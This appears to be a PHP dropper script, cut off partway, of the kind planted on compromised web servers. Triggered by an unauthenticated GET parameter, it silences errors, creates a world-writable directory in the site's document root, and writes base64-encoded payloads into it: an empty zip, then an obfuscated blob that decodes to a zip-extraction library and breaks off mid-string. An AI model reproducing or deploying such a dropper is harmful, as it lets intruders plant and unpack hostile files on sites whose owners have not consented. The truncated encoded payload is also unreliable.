<?php 
ini_set('display_errors','Off');
$path = $_SERVER["DOCUMENT_ROOT"];
if ($_GET["pass"] !== "")
{
$drname = $_GET["pass"];
}
else
{
$permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyz';
$drname =  substr(str_shuffle($permitted_chars), 0, 6);
}

mkdir("$path/$drname", 0777);
$data = base64_decode(""); 
file_put_contents("$path/$drname/fsrhdf.zip",$data); 
$data2 = base64_decode("PD9waHAgDQppZiAoIWRlZmluZWQoJ1BDTFpJUF9SRUFEX0JMT0NLX1NJWkUnKSkgew0KICBkZWZpbmUoICdQQ0xaSVBfUkVBRF9CTE9DS19TSVpFJywgMjA0OCApOw0KfQ0KDQppZiAoIWRlZmluZWQoJ1BDTFpJUF9TRVBBUkFUT1InKSkgew0KICBkZWZpbmUoICdQQ0xaSVBfU0VQQVJBVE9SJywgJywnICk7DQp9DQoNCmlmICghZGVmaW5lZCgnUENMWklQX0VSUk9SX0VYVEVSTkFMJykpIHsNCiAgZGVmaW5lKCAnUENMWklQX0VSUk9SX0VYVEVSTkFMJywgMCApOw0KfQ0KDQppZiAoIWRlZmluZWQoJ1BDTFpJUF9URU1QT1JBUllfRElSJykpIHsNCiAgZGVmaW5lKCAnUENMWklQX1RFTVBPUkFSWV9ESVInLCAnJyApOw0KfQ0KDQppZiAoIWRlZmluZWQoJ1BDTFpJUF9URU1QT1JBUllfRklMRV9SQVRJTycpKSB7DQogIGRlZmluZSggJ1BDTFpJUF9URU1QT1JBUllfRklMRV9SQVRJTycsIDAuNDcgKTsNCn0NCg0KDQokZ19wY2x6aXBfdmVyc2lvbiA9ICIyLjguMiI7DQoNCmRlZmluZSggJ1BDTFpJUF9FUlJfVVNFUl9BQk9SVEVEJywgMiApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9OT19FUlJPUicsIDAgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfV1JJVEVfT1BFTl9GQUlMJywgLTEgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwnLCAtMiApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUicsIC0zICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX01JU1NJTkdfRklMRScsIC00ICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0ZJTEVOQU1FX1RPT19MT05HJywgLTUgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfSU5WQUxJRF9aSVAnLCAtNiApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9CQURfRVhUUkFDVEVEX0ZJTEUnLCAtNyApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9ESVJfQ1JFQVRFX0ZBSUwnLCAtOCApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9CQURfRVhURU5TSU9OJywgLTkgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfQkFEX0ZPUk1BVCcsIC0xMCApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9ERUxFVEVfRklMRV9GQUlMJywgLTExICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX1JFTkFNRV9GSUxFX0ZBSUwnLCAtMTIgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfQkFEX0NIRUNLU1VNJywgLTEzICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0lOVkFMSURfQVJDSElWRV9aSVAnLCAtMTQgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUnLCAtMTUgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUnLCAtMTYgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfQUxSRUFEWV9BX0RJUkVDVE9SWScsIC0xNyApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9VTlNVUFBPUlRFRF9DT01QUkVTU0lPTicsIC0xOCApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9VTlNVUFBPUlRFRF9FTkNSWVBUSU9OJywgLTE5ICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFJywgLTIwICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0RJUkVDVE9SWV9SRVNUUklDVElPTicsIC0yMSApOw0KDQpkZWZpbmUoICdQQ0xaSVBfT1BUX1BBVEgnLCA3NzAwMSApOw0KZGVmaW5lKCAnUENMWklQX09QVF9BRERfUEFUSCcsIDc3MDAyICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIJywgNzcwMDMgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIJywgNzcwMDQgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfU0VUX0NITU9EJywgNzcwMDUgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfRVhUUkFDVF9BU19TVFJJTkcnLCA3NzAwNiApOw0KZGVmaW5lKCAnUENMWklQX09QVF9OT19DT01QUkVTU0lPTicsIDc3MDA3ICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX0JZX05BTUUnLCA3NzAwOCApOw0KZGVmaW5lKCAnUENMWklQX09QVF9CWV9JTkRFWCcsIDc3MDA5ICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX0JZX0VSRUcnLCA3NzAxMCApOw0KZGVmaW5lKCAnUENMWklQX09QVF9CWV9QUkVHJywgNzcwMTEgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfQ09NTUVOVCcsIDc3MDEyICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX0FERF9DT01NRU5UJywgNzcwMTMgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfUFJFUEVORF9DT01NRU5UJywgNzcwMTQgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfRVhUUkFDVF9JTl9PVVRQVVQnLCA3NzAxNSApOw0KZGVmaW5lKCAnUENMWklQX09QVF9SRVBMQUNFX05FV0VSJywgNzcwMTYgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUicsIDc3MDE3ICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX0VYVFJBQ1RfRElSX1JFU1RSSUNUSU9OJywgNzcwMTkgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRCcsIDc3MDIwICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX1RFTVBfRklMRV9PTicsIDc3MDIxICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX1RFTVBfRklMRV9PRkYnLCA3NzAyMiApOw0KDQpkZWZpbmUoICdQQ0xaSVBfQVRUX0ZJTEVfTkFNRScsIDc5MDAxICk7DQpkZWZpbmUoICdQQ0xaSVBfQVRUX0ZJTEVfTkVXX1NIT1JUX05BTUUnLCA3OTAwMiApOw0KZGVmaW5lKCAnUENMWklQX0FUVF9GSUxFX05FV19GVUxMX05BTUUnLCA3OTAwMyApOw0KZGVmaW5lKCAnUENMWklQX0FUVF9GSUxFX01USU1FJywgNzkwMDQgKTsNCmRlZmluZSggJ1BDTFpJUF9BVFRfRklMRV9DT05URU5UJywgNzkwMDUgKTsNCmRlZmluZSggJ1BDTFpJUF9BVFRfRklMRV9DT01NRU5UJywgNzkwMDYgKTsNCg0KZGVmaW5lKCAnUENMWklQX0NCX1BSRV9FWFRSQUNUJywgNzgwMDEgKTsNCmRlZmluZSggJ1BDTFpJUF9DQl9QT1NUX0VYVFJBQ1QnLCA3ODAwMiApOw0KZGVmaW5lKCAnUENMWklQX0NCX1BSRV9BREQnLCA3ODAwMyApOw0KZGVmaW5lKCAnUENMWklQX0NCX1BPU1RfQUREJywgNzgwMDQgKTsNCg0KY2xhc3MgUGNsWmlwDQp7DQogIHZhciAkemlwbmFtZSA9ICcnOw0KDQogIHZhciAkemlwX2ZkID0gMDsNCg0KICB2YXIgJGVycm9yX2NvZGUgPSAxOw0KICB2YXIgJGVycm9yX3N0cmluZyA9ICcnOw0KICANCiAgdmFyICRtYWdpY19xdW90ZXNfc3RhdHVzOw0KDQpmdW5jdGlvbiBQY2xaaXAoJHBfemlwbmFtZSkNCnsNCg0KICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygnZ3pvcGVuJykpDQogIHsNCiAgICBkaWUoJ0Fib3J0ICcuYmFzZW5hbWUoX19GSUxFX18pLicgOiBNaXNzaW5nIHpsaWIgZXh0ZW5zaW9ucycpOw0KICB9DQoNCiAgJHRoaXMtPnppcG5hbWUgPSAkcF96aXBuYW1lOw0KICAkdGhpcy0+emlwX2ZkID0gMDsNCiAgJHRoaXMtPm1hZ2ljX3F1b3Rlc19zdGF0dXMgPSAtMTsNCg0KICByZXR1cm47DQp9DQoNCmZ1bmN0aW9uIGNyZWF0ZSgkcF9maWxlbGlzdCkNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHRoaXMtPnByaXZFcnJvclJlc2V0KCk7DQoNCiAgJHZfb3B0aW9ucyA9IGFycmF5KCk7DQogICR2X29wdGlvbnNbUENMWklQX09QVF9OT19DT01QUkVTU0lPTl0gPSBGQUxTRTsNCg0KICAkdl9zaXplID0gZnVuY19udW1fYXJncygpOw0KDQogIGlmICgkdl9zaXplID4gMSkgew0KICAgICR2X2FyZ19saXN0ID0gZnVuY19nZXRfYXJncygpOw0KDQogICAgYXJyYXlfc2hpZnQoJHZfYXJnX2xpc3QpOw0KICAgICR2X3NpemUtLTsNCg0KICAgIGlmICgoaXNfaW50ZWdlcigkdl9hcmdfbGlzdFswXSkpICYmICgkdl9hcmdfbGlzdFswXSA+IDc3MDAwKSkgew0KDQogICAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlBhcnNlT3B0aW9ucygkdl9hcmdfbGlzdCwgJHZfc2l6ZSwgJHZfb3B0aW9ucywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFycmF5IChQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0FERF9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX0NCX1BSRV9BREQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfQ0JfUE9TVF9BREQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX05PX0NPTVBSRVNTSU9OID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9DT01NRU5UID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9URU1QX0ZJTEVfT04gPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1RFTVBfRklMRV9PRkYgPT4gJ29wdGlvbmFsJw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkpOw0KICAgICAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgICAgIHJldHVybiAwOw0KICAgICAgfQ0KICAgIH0NCg0KICAgIGVsc2Ugew0KDQogICAgICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfQUREX1BBVEhdID0gJHZfYXJnX2xpc3RbMF07DQoNCiAgICAgIGlmICgkdl9zaXplID09IDIpIHsNCiAgICAgICAgJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIXSA9ICR2X2FyZ19saXN0WzFdOw0KICAgICAgfQ0KICAgICAgZWxzZSBpZiAoJHZfc2l6ZSA+IDIpIHsNCiAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwNCgkgICAgICAgICAgICAgICAgICAgICAgICJJbnZhbGlkIG51bWJlciAvIHR5cGUgb2YgYXJndW1lbnRzIik7DQogICAgICAgIHJldHVybiAwOw0KICAgICAgfQ0KICAgIH0NCiAgfQ0KICANCiAgJHRoaXMtPnByaXZPcHRpb25EZWZhdWx0VGhyZXNob2xkKCR2X29wdGlvbnMpOw0KDQogICR2X3N0cmluZ19saXN0ID0gYXJyYXkoKTsNCiAgJHZfYXR0X2xpc3QgPSBhcnJheSgpOw0KICAkdl9maWxlZGVzY3JfbGlzdCA9IGFycmF5KCk7DQogICRwX3Jlc3VsdF9saXN0ID0gYXJyYXkoKTsNCiAgDQogIGlmIChpc19hcnJheSgkcF9maWxlbGlzdCkpIHsNCiAgDQogICAgaWYgKGlzc2V0KCRwX2ZpbGVsaXN0WzBdKSAmJiBpc19hcnJheSgkcF9maWxlbGlzdFswXSkpIHsNCiAgICAgICR2X2F0dF9saXN0ID0gJHBfZmlsZWxpc3Q7DQogICAgfQ0KICAgIA0KICAgIGVsc2Ugew0KICAgICAgJHZfc3RyaW5nX2xpc3QgPSAkcF9maWxlbGlzdDsNCiAgICB9DQogIH0NCg0KICBlbHNlIGlmIChpc19zdHJpbmcoJHBfZmlsZWxpc3QpKSB7DQogICAgJHZfc3RyaW5nX2xpc3QgPSBleHBsb2RlKFBDTFpJUF9TRVBBUkFUT1IsICRwX2ZpbGVsaXN0KTsNCiAgfQ0KDQogIGVsc2Ugew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIHZhcmlhYmxlIHR5cGUgcF9maWxlbGlzdCIpOw0KICAgIHJldHVybiAwOw0KICB9DQogIA0KICBpZiAoc2l6ZW9mKCR2X3N0cmluZ19saXN0KSAhPSAwKSB7DQogICAgZm9yZWFjaCAoJHZfc3RyaW5nX2xpc3QgYXMgJHZfc3RyaW5nKSB7DQogICAgICBpZiAoJHZfc3RyaW5nICE9ICcnKSB7DQogICAgICAgICR2X2F0dF9saXN0W11bUENMWklQX0FUVF9GSUxFX05BTUVdID0gJHZfc3RyaW5nOw0KICAgICAgfQ0KICAgICAgZWxzZSB7DQogICAgICB9DQogICAgfQ0KICB9DQogIA0KICAkdl9zdXBwb3J0ZWRfYXR0cmlidXRlcw0KICA9IGFycmF5ICggUENMWklQX0FUVF9GSUxFX05BTUUgPT4gJ21hbmRhdG9yeScNCiAgICAgICAgICAgLFBDTFpJUF9BVFRfRklMRV9ORVdfU0hPUlRfTkFNRSA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICxQQ0xaSVBfQVRUX0ZJTEVfTkVXX0ZVTExfTkFNRSA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICxQQ0xaSVBfQVRUX0ZJTEVfTVRJTUUgPT4gJ29wdGlvbmFsJw0KICAgICAgICAgICAsUENMWklQX0FUVF9GSUxFX0NPTlRFTlQgPT4gJ29wdGlvbmFsJw0KICAgICAgICAgICAsUENMWklQX0FUVF9GSUxFX0NPTU1FTlQgPT4gJ29wdGlvbmFsJw0KCQkJCQkpOw0KICBmb3JlYWNoICgkdl9hdHRfbGlzdCBhcyAkdl9lbnRyeSkgew0KICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RmlsZURlc2NyUGFyc2VBdHQoJHZfZW50cnksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdl9maWxlZGVzY3JfbGlzdFtdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZfb3B0aW9ucywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2X3N1cHBvcnRlZF9hdHRyaWJ1dGVzKTsNCiAgICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgfQ0KDQogICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RmlsZURlc2NyRXhwYW5kKCR2X2ZpbGVkZXNjcl9saXN0LCAkdl9vcHRpb25zKTsNCiAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgcmV0dXJuIDA7DQogIH0NCg0KICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkNyZWF0ZSgkdl9maWxlZGVzY3JfbGlzdCwgJHBfcmVzdWx0X2xpc3QsICR2X29wdGlvbnMpOw0KICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICByZXR1cm4gMDsNCiAgfQ0KDQogIHJldHVybiAkcF9yZXN1bHRfbGlzdDsNCn0NCg0KZnVuY3Rpb24gYWRkKCRwX2ZpbGVsaXN0KQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdGhpcy0+cHJpdkVycm9yUmVzZXQoKTsNCg0KICAkdl9vcHRpb25zID0gYXJyYXkoKTsNCiAgJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX05PX0NPTVBSRVNTSU9OXSA9IEZBTFNFOw0KDQogICR2X3NpemUgPSBmdW5jX251bV9hcmdzKCk7DQoNCiAgaWYgKCR2X3NpemUgPiAxKSB7DQogICAgJHZfYXJnX2xpc3QgPSBmdW5jX2dldF9hcmdzKCk7DQoNCiAgICBhcnJheV9zaGlmdCgkdl9hcmdfbGlzdCk7DQogICAgJHZfc2l6ZS0tOw0KDQogICAgaWYgKChpc19pbnRlZ2VyKCR2X2FyZ19saXN0WzBdKSkgJiYgKCR2X2FyZ19saXN0WzBdID4gNzcwMDApKSB7DQoNCiAgICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UGFyc2VPcHRpb25zKCR2X2FyZ19saXN0LCAkdl9zaXplLCAkdl9vcHRpb25zLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkgKFBDTFpJUF9PUFRfUkVNT1ZFX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1JFTU9WRV9BTExfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQUREX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfQ0JfUFJFX0FERCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9DQl9QT1NUX0FERCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfTk9fQ09NUFJFU1NJT04gPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0NPTU1FTlQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0FERF9DT01NRU5UID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9QUkVQRU5EX0NPTU1FTlQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTEQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1RFTVBfRklMRV9PTiA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09GRiA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoJCQkJCQkJCQkJCSAgICkpOw0KICAgICAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgICAgIHJldHVybiAwOw0KICAgICAgfQ0KICAgIH0NCg0KICAgIGVsc2Ugew0KDQogICAgICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfQUREX1BBVEhdID0gJHZfYWRkX3BhdGggPSAkdl9hcmdfbGlzdFswXTsNCg0KICAgICAgaWYgKCR2X3NpemUgPT0gMikgew0KICAgICAgICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX1BBVEhdID0gJHZfYXJnX2xpc3RbMV07DQogICAgICB9DQogICAgICBlbHNlIGlmICgkdl9zaXplID4gMikgew0KICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiSW52YWxpZCBudW1iZXIgLyB0eXBlIG9mIGFyZ3VtZW50cyIpOw0KDQogICAgICAgIHJldHVybiAwOw0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogICR0aGlzLT5wcml2T3B0aW9uRGVmYXVsdFRocmVzaG9sZCgkdl9vcHRpb25zKTsNCg0KICAkdl9zdHJpbmdfbGlzdCA9IGFycmF5KCk7DQogICR2X2F0dF9saXN0ID0gYXJyYXkoKTsNCiAgJHZfZmlsZWRlc2NyX2xpc3QgPSBhcnJheSgpOw0KICAkcF9yZXN1bHRfbGlzdCA9IGFycmF5KCk7DQogIA0KICBpZiAoaXNfYXJyYXkoJHBfZmlsZWxpc3QpKSB7DQogIA0KICAgIGlmIChpc3NldCgkcF9maWxlbGlzdFswXSkgJiYgaXNfYXJyYXkoJHBfZmlsZWxpc3RbMF0pKSB7DQogICAgICAkdl9hdHRfbGlzdCA9ICRwX2ZpbGVsaXN0Ow0KICAgIH0NCiAgICANCiAgICBlbHNlIHsNCiAgICAgICR2X3N0cmluZ19saXN0ID0gJHBfZmlsZWxpc3Q7DQogICAgfQ0KICB9DQoNCiAgZWxzZSBpZiAoaXNfc3RyaW5nKCRwX2ZpbGVsaXN0KSkgew0KICAgICR2X3N0cmluZ19saXN0ID0gZXhwbG9kZShQQ0xaSVBfU0VQQVJBVE9SLCAkcF9maWxlbGlzdCk7DQogIH0NCg0KICBlbHNlIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiSW52YWxpZCB2YXJpYWJsZSB0eXBlICciLmdldHR5cGUoJHBfZmlsZWxpc3QpLiInIGZvciBwX2ZpbGVsaXN0Iik7DQogICAgcmV0dXJuIDA7DQogIH0NCiAgDQogIGlmIChzaXplb2YoJHZfc3RyaW5nX2xpc3QpICE9IDApIHsNCiAgICBmb3JlYWNoICgkdl9zdHJpbmdfbGlzdCBhcyAkdl9zdHJpbmcpIHsNCiAgICAgICR2X2F0dF9saXN0W11bUENMWklQX0FUVF9GSUxFX05BTUVdID0gJHZfc3RyaW5nOw0KICAgIH0NCiAgfQ0KICANCiAgJHZfc3VwcG9ydGVkX2F0dHJpYnV0ZXMNCiAgPSBhcnJheSAoIFBDTFpJUF9BVFRfRklMRV9OQU1FID0+ICdtYW5kYXRvcnknDQogICAgICAgICAgICxQQ0xaSVBfQVRUX0ZJTEVfTkVXX1NIT1JUX05BTUUgPT4gJ29wdGlvbmFsJw0KICAgICAgICAgICAsUENMWklQX0FUVF9GSUxFX05FV19GVUxMX05BTUUgPT4gJ29wdGlvbmFsJw0KICAgICAgICAgICAsUENMWklQX0FUVF9GSUxFX01USU1FID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgLFBDTFpJUF9BVFRfRklMRV9DT05URU5UID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgLFBDTFpJUF9BVFRfRklMRV9DT01NRU5UID0+ICdvcHRpb25hbCcNCgkJCQkJKTsNCiAgZm9yZWFjaCAoJHZfYXR0X2xpc3QgYXMgJHZfZW50cnkpIHsNCiAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkZpbGVEZXNjclBhcnNlQXR0KCR2X2VudHJ5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZfZmlsZWRlc2NyX2xpc3RbXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2X29wdGlvbnMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdl9zdXBwb3J0ZWRfYXR0cmlidXRlcyk7DQogICAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgICByZXR1cm4gMDsNCiAgICB9DQogIH0NCg0KICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkZpbGVEZXNjckV4cGFuZCgkdl9maWxlZGVzY3JfbGlzdCwgJHZfb3B0aW9ucyk7DQogIGlmICgkdl9yZXN1bHQgIT0gMSkgew0KICAgIHJldHVybiAwOw0KICB9DQoNCiAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZBZGQoJHZfZmlsZWRlc2NyX2xpc3QsICRwX3Jlc3VsdF9saXN0LCAkdl9vcHRpb25zKTsNCiAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgcmV0dXJuIDA7DQogIH0NCg0KICByZXR1cm4gJHBfcmVzdWx0X2xpc3Q7DQp9DQoNCmZ1bmN0aW9uIGxpc3RDb250ZW50KCkNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHRoaXMtPnByaXZFcnJvclJlc2V0KCk7DQoNCiAgaWYgKCEkdGhpcy0+cHJpdkNoZWNrRm9ybWF0KCkpIHsNCiAgICByZXR1cm4oMCk7DQogIH0NCg0KICAkcF9saXN0ID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkxpc3QoJHBfbGlzdCkpICE9IDEpDQogIHsNCiAgICB1bnNldCgkcF9saXN0KTsNCiAgICByZXR1cm4oMCk7DQogIH0NCg0KICByZXR1cm4gJHBfbGlzdDsNCn0NCg0KZnVuY3Rpb24gZXh0cmFjdCgpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogIGlmICghJHRoaXMtPnByaXZDaGVja0Zvcm1hdCgpKSB7DQogICAgcmV0dXJuKDApOw0KICB9DQoNCiAgJHZfb3B0aW9ucyA9IGFycmF5KCk7DQogICR2X3BhdGggPSAnJzsNCiAgJHZfcmVtb3ZlX3BhdGggPSAiIjsNCiAgJHZfcmVtb3ZlX2FsbF9wYXRoID0gZmFsc2U7DQoNCiAgJHZfc2l6ZSA9IGZ1bmNfbnVtX2FyZ3MoKTsNCg0KICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfRVhUUkFDVF9BU19TVFJJTkddID0gRkFMU0U7DQoNCiAgaWYgKCR2X3NpemUgPiAwKSB7DQogICAgJHZfYXJnX2xpc3QgPSBmdW5jX2dldF9hcmdzKCk7DQoNCiAgICBpZiAoKGlzX2ludGVnZXIoJHZfYXJnX2xpc3RbMF0pKSAmJiAoJHZfYXJnX2xpc3RbMF0gPiA3NzAwMCkpIHsNCg0KICAgICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZQYXJzZU9wdGlvbnMoJHZfYXJnX2xpc3QsICR2X3NpemUsICR2X29wdGlvbnMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcnJheSAoUENMWklQX09QVF9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9SRU1PVkVfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9BRERfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9DQl9QUkVfRVhUUkFDVCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9D